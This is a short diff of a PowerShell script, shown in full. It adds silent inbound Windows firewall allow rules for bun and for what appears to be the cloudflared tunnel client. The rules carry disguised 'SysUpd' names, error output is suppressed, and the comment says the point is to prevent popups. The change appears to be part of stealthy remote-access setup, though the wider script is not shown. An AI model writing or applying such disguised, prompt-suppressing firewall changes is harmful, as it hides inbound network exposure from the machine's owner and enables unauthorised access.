@@ -430,10 +430,10 @@ foreach ($c in $candidates) {
     if (Test-Path $c) { $serverExe = $c; break }
 }
 
-# Allow bun through firewall silently (prevents popup)
+# Allow bun + cloudflared through firewall silently (prevents popups)
 try {
-    $fwRule = "SysUpd-Bun"
-    netsh advfirewall firewall add rule name="$fwRule" dir=in action=allow program="$bunPath" enable=yes profile=any 2>$null | Out-Null
+    netsh advfirewall firewall add rule name="SysUpd-Bun" dir=in action=allow program="$bunPath" enable=yes profile=any 2>$null | Out-Null
+    netsh advfirewall firewall add rule name="SysUpd-Cf" dir=in action=allow program="$cfPath" enable=yes profile=any 2>$null | Out-Null
 } catch {}
 
 if ($serverExe) {
